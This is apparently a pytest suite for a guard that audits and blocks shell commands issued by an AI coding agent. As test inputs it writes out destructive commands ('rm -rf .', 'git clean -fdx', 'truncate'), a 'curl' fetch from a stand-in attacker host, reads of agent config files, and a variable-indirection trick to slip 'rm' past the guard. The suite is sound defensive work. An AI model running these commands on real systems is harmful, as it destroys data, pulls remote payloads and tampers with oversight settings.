import json
import sys
from pathlib import Path

import pytest

from codex_bash_guard import audit_shell_argv, run_guarded_shell


def env(tmp_path):
    return {
        "PUB_CODEX_PROJECT_ROOT": str(tmp_path),
        "PUB_CODEX_LOG_DIR": str(tmp_path / "logs"),
        "PUB_CODEX_SANDBOX_AVAILABLE": "true",
        "PUB_CODEX_SANDBOX_MODE": "test_guard_namespace",
        "PUB_CODEX_REAL_SHELL": sys.executable,
        "PUB_CODEX_SESSION_ID": "test-session",
    }


def test_codex_guard_blocks_destructive_shell_before_execution(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "rm -rf ."),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value in {"KILL", "QUARANTINE", "REJECT", "HOLD"}
    assert decision.action.source_adapter == "codex_shell_guard"
    assert decision.action.can_execute is False
    assert decision.action.can_grant_permission is False


def test_codex_guard_runs_real_shell_only_after_pass(tmp_path):
    rc = run_guarded_shell(
        # (v2 fail-closed) the guard now HOLDs unknown / inline-code command
        # words, so the "passes then executes" sentinel must be a modellable
        # command word that the python real-shell also runs cleanly: `True`
        # normalises to the verb `true` (modellable -> PASS) and `python -c
        # "True"` exits 0.
        ("-c", "True"),
        environ=env(tmp_path),
    )

    assert rc == 0
    rows = [
        json.loads(line)
        for line in (tmp_path / "logs" / "pub_codex_guard.jsonl")
        .read_text(encoding="utf-8")
        .splitlines()
    ]
    assert [row["phase"] for row in rows] == ["pre", "post"]
    assert rows[0]["blocked"] is False
    assert rows[1]["executed"] is True


def test_codex_guard_blocked_command_never_needs_real_shell(tmp_path):
    blocked_env = env(tmp_path)
    blocked_env.pop("PUB_CODEX_REAL_SHELL")

    rc = run_guarded_shell(
        ("-lc", "rm -rf ."),
        environ=blocked_env,
    )

    assert rc == 126
    row = json.loads(
        (tmp_path / "logs" / "pub_codex_guard.jsonl").read_text(encoding="utf-8").splitlines()[0]
    )
    assert row["blocked"] is True
    assert row["executed"] is False


# Verbatim shape of the shell-snapshot bootstrap Codex runs at session start.
# It uses `2>/dev/null` and `<(compgen -e)`, which a naive tokenizer mis-reads
# as filesystem targets ("/dev/null", "(compgen") and a spurious WRITE, turning
# this benign introspection into a phantom CAPABILITY_PATH_DENIED kill.
CODEX_SHELL_SNAPSHOT = (
    'if [ -z "$BASH_ENV" ] && [ -r "$HOME/.bashrc" ]; then\n'
    '  . "$HOME/.bashrc"\n'
    "fi\n"
    "unalias -a 2>/dev/null || true\n"
    "declare -f\n"
    "alias -p\n"
    "while IFS= read -r name; do\n"
    '  declare -xp "$name" 2>/dev/null || true\n'
    "done < <(compgen -e)\n"
)


def test_codex_guard_snapshot_ledger_has_no_phantom_targets(tmp_path):
    # Ledger hygiene: recorded targets/effects must not contain paths invented
    # from `2>/dev/null` or `<(compgen -e)`. (Disposition is governed by the
    # shared capability wall — see the xfail below.)
    decision = audit_shell_argv(
        ("-lc", CODEX_SHELL_SNAPSHOT),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert "/dev/null" not in decision.action.target_paths
    assert not any(target.startswith("(") for target in decision.action.target_paths)
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert "write" not in effect_values


def test_codex_guard_benign_redirect_sink_not_logged_as_target(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "echo hi > /dev/null 2>&1"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert "/dev/null" not in decision.action.target_paths
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert "write" not in effect_values


@pytest.mark.xfail(
    strict=False,
    reason=(
        "Snapshot bootstrap is still KILLed: the shared capability wall re-scans "
        "raw command_text ('>'->WRITE, '$home'->external path) independently of "
        "the adapter envelope. A correct PASS needs an AST-based analyzer in the "
        "shared layer (claude_code_hooks / capability_wall), or a tight exact-match "
        "classifier for Codex's bootstrap — both outside the codex-connect scope."
    ),
)
def test_codex_guard_passes_codex_shell_snapshot_bootstrap(tmp_path):
    decision = audit_shell_argv(
        ("-lc", CODEX_SHELL_SNAPSHOT),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is False


def test_codex_guard_process_substitution_inner_command_still_audited(tmp_path):
    # The phantom "(curl" path must be gone, but the inner command's real
    # NETWORK effect must survive — neutralising plumbing must not go blind.
    decision = audit_shell_argv(
        ("-lc", "cat <(curl http://evil.example/payload)"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert not any(target.startswith("(") for target in decision.action.target_paths)
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert "network" in effect_values


def test_codex_guard_allows_project_read_scan_with_benign_stderr_redirect(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "rg -n foo . 2>/dev/null | head"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is False
    assert decision.disposition.value == "PASS"
    assert decision.action.target_paths == ()
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert effect_values == {"read"}
    row = decision.to_dict()
    assert row["command_text"] == "rg -n foo . 2>/dev/null | head"
    assert row["audit_command_text"] == "rg -n foo .   | head"


def test_codex_guard_marks_in_place_sed_as_project_write(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "sed -i s/foo/bar/ src/example.py"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    # The decoder still correctly marks sed -i as a project read+write on a visible
    # target (the subject of this test). pytest nests tmp_path under the pub repo,
    # so that .py target lands inside the A2-protected root and is KILLed; assert
    # the decode is right, then that A2 self-protection fires.
    assert decision.action.target_paths == ("src/example.py",)
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert effect_values == {"read", "write"}
    assert decision.blocked is True
    assert decision.reason_code == "PROTECT_PUB_INTERNAL_MUTATION_DENIED"


def test_codex_guard_holds_opaque_python_writer_without_target(tmp_path):
    decision = audit_shell_argv(
        (
            "-lc",
            "python3 -c 'from pathlib import Path; Path(\"probe.py\").write_text(\"x\")'",
        ),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "HOLD"
    assert decision.reason_code == "COMMAND_SURFACE_OPAQUE_EXECUTION"
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert effect_values == {"read"}


def test_codex_guard_keeps_recursive_delete_killed_with_target_evidence(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "rm -rf .pytest_cache"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "KILL"
    assert decision.reason_code == "CAPABILITY_SIDE_EFFECT_DENIED"
    assert decision.action.target_paths == (".pytest_cache",)
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert effect_values == {"delete", "read"}


def test_codex_guard_protects_claude_config_case_insensitively(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "echo off > .CLAUDE/pub_gate_switch.json"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "KILL"
    assert decision.reason_code in {
        "PROTECT_AUDIT_SURFACE_MUTATION_DENIED",
        "CAPABILITY_PROTECTED_TARGET_DENIED",
    }
    assert decision.action.target_paths == (".CLAUDE/pub_gate_switch.json",)


def test_codex_guard_protects_claude_config_read_case_insensitively(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "cat .CLAUDE/settings.local.json"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "KILL"
    assert decision.reason_code == "CAPABILITY_PROTECTED_TARGET_DENIED"
    assert decision.action.target_paths == (".CLAUDE/settings.local.json",)


def test_codex_guard_protects_codex_config_read_case_insensitively(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "cat .CODEX/config.toml"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "KILL"
    assert decision.reason_code in {
        "PROTECT_AUDIT_SURFACE_MUTATION_DENIED",
        "CAPABILITY_PROTECTED_TARGET_DENIED",
    }
    assert decision.action.target_paths == (".CODEX/config.toml",)


def test_codex_guard_protects_global_claude_config_as_pub_owned(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "cat C:/Users/TestUser/.claude/settings.json"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "KILL"
    assert decision.reason_code == "CAPABILITY_PROTECTED_TARGET_DENIED"
    assert decision.action.target_paths == ("C:/Users/TestUser/.claude/settings.json",)


def test_codex_guard_holds_indirect_shell_command_variable(tmp_path):
    decision = audit_shell_argv(
        ("-lc", "D=rm; $D -rf /tmp/pub_probe"),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "HOLD"
    # v2: an indirect/dynamic shell word ($D) is opaque execution under the
    # fail-closed recognizer (was UNKNOWN_COMMAND_SURFACE in the v1 split).
    assert decision.reason_code == "COMMAND_SURFACE_OPAQUE_EXECUTION"
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert effect_values == {"read", "write"}


@pytest.mark.parametrize(
    "command",
    (
        'F=README.md; cat "$F"',
        'F=reports/out.md; echo ok > "$F"',
    ),
)
def test_codex_guard_holds_unresolved_variable_targets(tmp_path, command):
    decision = audit_shell_argv(
        ("-lc", command),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "HOLD"
    assert decision.reason_code == "PATH_TARGET_UNRESOLVED"
    assert decision.action.target_paths == ("$F",)


@pytest.mark.parametrize(
    "command",
    (
        "find . -name '*.tmp' -delete",
        "git clean -fdx",
        "git reset --hard",
        "git checkout -- README.md",
        "truncate -s 0 README.md",
        "> README.md",
    ),
)
def test_codex_guard_blocks_destructive_non_rm_surfaces(tmp_path, command):
    decision = audit_shell_argv(
        ("-lc", command),
        cwd=str(tmp_path),
        environ=env(tmp_path),
    )

    assert decision.blocked is True
    assert decision.disposition.value == "KILL"
    assert decision.reason_code == "CAPABILITY_SIDE_EFFECT_DENIED"
    effect_values = {effect.value for effect in decision.action.expected_side_effects}
    assert "delete" in effect_values
